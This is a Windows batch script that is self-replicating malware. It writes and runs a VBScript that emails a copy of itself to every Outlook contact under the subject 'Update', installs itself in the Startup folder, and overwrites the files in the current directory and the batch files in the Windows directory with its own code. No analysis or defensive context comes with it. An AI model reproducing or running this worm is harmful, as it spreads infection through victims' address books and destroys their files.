@echo off
ctty nul
Set MyS=%0
copy %MyS% update.BAT
copy update.BAT C:\update.BAT
copy update.BAT C:\email.vbs
echo Dim x > C:\email.vbs
echo.on error resume next >> C:\email.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\email.vbs
echo Set so=CreateObject(fso) >> C:\email.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\email.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\email.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> C:\email.vbs
echo Set a = mapi.AddressLists(1) >> C:\email.vbs
echo For x=1 To a.AddressEntries.Count >> C:\email.vbs
echo Set Mail=ol.CreateItem(0) >> C:\email.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\email.vbs
echo Mail.Subject="Update" >> C:\email.vbs
echo Mail.Body="Update im Anhang (Mittwoch)" >> C:\email.vbs
echo Mail.Attachments.Add("C:\update.BAT") >> C:\email.vbs
echo Mail.Send >> C:\email.vbs
echo Next >> C:\email.vbs
echo ol.Quit >> C:\email.vbs
cscript C:\email.vbs
@del C:\email.vbs
@del C:\update.BAT
copy update.BAT %windir%\Start Menu\Programs\StartUp\StartUp.bat
md C:\suPs
copy update.BAT C:\suPs\olaf.xyv
ren C:\suPs\olaf.xyv snake.bat
subst L: C:\suPs
for %%v in (*.*) do copy update.BAT C:\hamlet.bat
for %%v in (*.*) do copy C:\hamlet.bat %%v
for %%v in (*.*) do ren *.* *.bat
@del C:\hamlet.bat
ren %WinDir%\*.bat *.ifk
copy update.BAT C:\wid.lal
for %%w in (%windir%\*.ifk) do copy C:\wid.lal %%w
ren %windir%\*.ifk *.bat
@del C:\wid.lal
@del update.BAT
ctty CON
